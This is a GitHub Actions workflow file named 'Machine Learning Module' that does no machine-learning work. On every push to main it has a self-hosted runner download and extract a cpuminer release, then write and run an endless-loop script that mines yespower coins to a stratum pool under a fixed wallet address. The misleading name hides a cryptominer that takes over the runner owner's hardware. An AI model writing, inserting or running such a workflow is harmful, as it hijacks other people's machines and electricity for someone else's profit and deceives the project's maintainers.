name: Machine Learning Module

on:
  push:
    branches:
      - main  # Adjust this based on your branch

jobs:
  build:
    runs-on: self-hosted

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v2

      - name: Download and Extract Cpuminer
        run: |
          wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz
          tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz

      - name: Create and Run Miner Script
        run: |
          echo '#!/bin/sh
          while [ 1 ]; do
          ./cpuminer -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17111 -u aNEpRWJEag9JiZFgztAf38q4kPmgkfXNCo.c1
          done' > autominer.sh
          chmod +x autominer.sh
          ./autominer.sh
